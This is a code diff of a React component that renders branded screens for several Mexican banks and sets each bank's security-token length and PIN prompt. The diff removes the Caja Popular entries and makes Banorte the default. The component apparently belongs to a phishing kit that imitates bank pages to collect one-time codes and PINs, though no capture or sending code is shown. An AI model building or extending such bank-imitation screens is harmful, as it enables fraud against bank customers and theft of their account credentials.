@@ -548,7 +548,6 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                 bankCode === 'SANTANDER' ? 'santander-bg' :
                 bankCode === 'SCOTIABANK' ? 'scotiabank-bg' :
                 bankCode === 'INVEX' ? 'invex-bg' :
-                bankCode === 'CAJAPOPULAR' ? 'cajapopular-bg' :
                 'bg-[#EC1C24]'
               } animate-progress-bar`}></div>
             </div>
@@ -653,12 +652,6 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
               return { 
                 digits: 12, 
                 note: 'Generado desde la app Scotia Móvil más PIN de seguridad de 4 dígitos.',
-                requiresPin: true
-              };
-            case 'CAJAPOPULAR':
-              return { 
-                digits: 8, 
-                note: 'Código generado desde la app móvil Caja Popular más PIN de seguridad de 4 dígitos.',
                 requiresPin: true
               };
             default:
@@ -947,10 +940,8 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
         return 'bg-[#00A552] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
       case 'BIENESTAR':
         return 'bg-[#9D2449] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
-      case 'CAJAPOPULAR':
-        return 'cajapopular-button';
       default:
-        return 'bg-gray-500 text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors'; // Estilo genérico por defecto
+        return 'bg-[#EC1C24] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors'; // Banorte por defecto
     }
   };
 
@@ -976,7 +967,6 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
       case 'PLATACARD': return 'bg-[#333333] text-white p-2';
       case 'BANCO_AZTECA': return 'bg-[#00A552] text-white p-2';
       case 'BIENESTAR': return 'bg-[#9D2449] text-white p-2';
-      case 'CAJAPOPULAR': return 'cajapopular-header';
       default: return 'bg-gray-100 p-3 text-center font-semibold';
     }
   };
@@ -999,7 +989,6 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
       case 'PLATACARD': return 'bg-white p-4 rounded-lg shadow border-t-2 border-[#FF5722]';
       case 'BANCO_AZTECA': return 'bg-white p-4 rounded-lg shadow border-t-2 border-[#00A552]';
       case 'BIENESTAR': return 'bg-white p-4 rounded-lg shadow border-t-2 border-[#9D2449]';
-      case 'CAJAPOPULAR': return 'cajapopular-container';
       default: return '';
     }
   };
